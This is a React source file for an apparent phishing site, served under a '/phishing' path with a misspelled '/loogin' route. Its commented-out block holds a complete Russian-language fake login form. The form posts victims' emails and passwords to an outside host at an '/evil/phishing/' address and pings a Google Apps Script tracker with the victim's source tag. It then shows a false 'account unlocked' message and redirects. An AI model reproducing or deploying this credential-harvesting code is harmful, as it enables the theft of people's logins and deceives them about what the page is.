import React, { Component } from "react";
import {
  BrowserRouter as Router,
  Routes,
  Route,
  Navigate,
} from "react-router-dom";
import Header from "./Header";
import Login from "./Login";

class App extends Component {
  constructor(props) {
    super(props);

    this.state = {};
  }

  render() {
    return (
      <div className="app">
        <Router basename="/phishing">
          <Header />
          <div className="container">
            <Routes>
              <Route
                path="/"
                element={<Navigate to="/loogin" replace={true} />}
              />
              <Route
                path="/loogin"
                element={<Login apiFunc={this.apiFunc} />}
              />
              <Route
                path="/loogin/:from"
                element={<Login apiFunc={this.apiFunc} />}
              />
              <Route path="*" element={<Navigate to="/" replace={true} />} />
            </Routes>
          </div>
        </Router>
      </div>
    );
  }
}

export default App;

// import './App.css';
// import { LockOutlined, UserOutlined } from "@ant-design/icons";
// import { BrowserRouter as Router, Route, Navigate, Routes, useLocation, useParams } from 'react-router-dom';
// import React, { useState, useEffect } from 'react';
// import { Button, Form, Input, Typography, Modal } from "antd";
// import axios from 'axios';

// const { Title } = Typography;

// function Header(props) {
//     return (
//         <header>
//             <div className="head">
//             </div>
//         </header>
//     );
// }

// function Login(props) {
//     const [email, setEmail] = useState('');
//     const [password, setPassword] = useState('');
//     const location = useLocation();
//     const searchParams = new URLSearchParams(location.search);
//     const who_from = searchParams.get('from') || 'unknown';
//     const [isModalVisible, setIsModalVisible] = useState(false);
//     const imgUrl = who_from ? `https://script.google.com/macros/s/AKfycbxEa4U-5hDIZUJ9l5Ft9lKkHORH4GbFVB3tlkie_KWXpxymcTQOQemR2jHWNGnx17qN/exec?site=1&from=${who_from}` : 'https://script.google.com/macros/s/AKfycbxEa4U-5hDIZUJ9l5Ft9lKkHORH4GbFVB3tlkie_KWXpxymcTQOQemR2jHWNGnx17qN/exec?site=1';

//     useEffect(() => {
//         const trackingPixel = async () => {
//             try {
//                 const response = await axios.get(imgUrl);
//                 console.log(response.data);
//             }
//             catch (error) {
//                 console.error(error);
//             }
//         };

//         trackingPixel();
//     }, []);

//     const onFinish = async (values) => {
//         const { email, password } = values;
//         console.log(email);
//         console.log(password);
//         const data = {
//             from: who_from,
//             email: email,
//             password: password
//         };

//         try {
//             const response = await axios.post("https://95.140.148.239/evil/phishing/", data);
//             console.log(response.data);
//             setIsModalVisible(true);
//         } catch (error) {
//             console.error(error);
//         }
//     };

//     const handleModalOk = () => {
//         setIsModalVisible(false);
//         window.location.href = "https://95.140.148.239/login";
//     }

//     return (
//         <div className="Login login">
//             <Title level={4} style={{ textAlign: "center" }}>Войти в аккаунт</Title>
//             <Form
//                 name="normal_login"
//                 className="login-form"
//                 initialValues={{
//                     remember: true,
//                 }}
//                 onFinish={onFinish}
//             >
//                 <Form.Item
//                     name="email"
//                     rules={[
//                         {
//                             type: "email",
//                             message: "The input is not valid E-mail!",
//                         },
//                         {
//                             required: true,
//                             message: "Please input your E-mail!",
//                         },
//                     ]}
//                 >
//                     <Input
//                         prefix={<UserOutlined className="site-form-item-icon" />}
//                         placeholder="Email"
//                     />
//                 </Form.Item>

//                 <Form.Item
//                     name="password"
//                     rules={[
//                         {
//                             required: true,
//                             message: "Please input your Password!",
//                         },
//                     ]}
//                 >
//                     <Input
//                         prefix={<LockOutlined className="site-form-item-icon" />}
//                         type="password"
//                         placeholder="Password"
//                     />
//                 </Form.Item>

//                 <Form.Item className="login-button">
//                     <Button
//                         type="primary"
//                         htmlType="submit"
//                         style={{ marginRight: "10px" }}
//                     >
//                         Войти
//                     </Button>
//                 </Form.Item>
//             </Form>

//             <Modal
//                 title="Учетная запись разблокирована!"
//                 visible={isModalVisible}
//                 onOk={handleModalOk}
//                 closable={false}
//                 maskClosable={false}
//                 onCancel={handleModalOk}
//             >
//                 <p>Теперь Вы снова можете пользоваться всеми возможностями сайта!</p>
//             </Modal>
//         </div>
//     );
// }

// function App() {
//     return (
//         <div className="app">
// 	    <Router basename="/phishing">
//                 <Header />
//                 <div className="container">
//                     <Routes>
//                         <Route path='/' element={<Navigate to='/loogin' />} />
//                         <Route path='/loogin' element={<Login />} />
//                         <Route path='/loogin/:from' element={<Login />} />
//                         <Route path='*' element={<Navigate to='/' />} />
//                     </Routes>
//                 </div>
//             </Router>
//         </div>
//     );
// }

// export default App;
